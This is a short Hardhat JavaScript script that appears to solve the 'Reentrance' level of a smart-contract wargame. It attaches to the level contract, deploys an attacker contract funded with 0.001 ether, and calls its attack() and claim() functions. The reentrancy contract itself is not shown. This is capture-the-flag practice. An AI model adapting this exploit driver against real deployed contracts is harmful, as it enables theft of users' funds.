const { ethers } = require("hardhat");
const hre = require("hardhat");
async function main() {
    
    //Params
    levelAddress = "0x918f9A0975b5Ef33AB09a665a99B44762eE4e50A";
    contractName = "Reentrance";

    const account = await hre.ethers.getSigner();
    console.log(`Working with account ${account.address}`);
    const Level = await hre.ethers.getContractFactory(contractName);
    const level = await Level.attach(levelAddress);
    console.log(`Level at address ${levelAddress}`);
    const Attacker = await hre.ethers.getContractFactory(`Attacker${contractName}`);
    const attacker = await Attacker.deploy(levelAddress,{value: hre.ethers.utils.parseEther("0.001")});
    console.log(`Attacker at ${attacker.address}`);

    
    tx = await attacker.attack();
    tr = await tx.wait();

    tx = await attacker.claim();
    tr = await tx.wait();
    

    
    
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
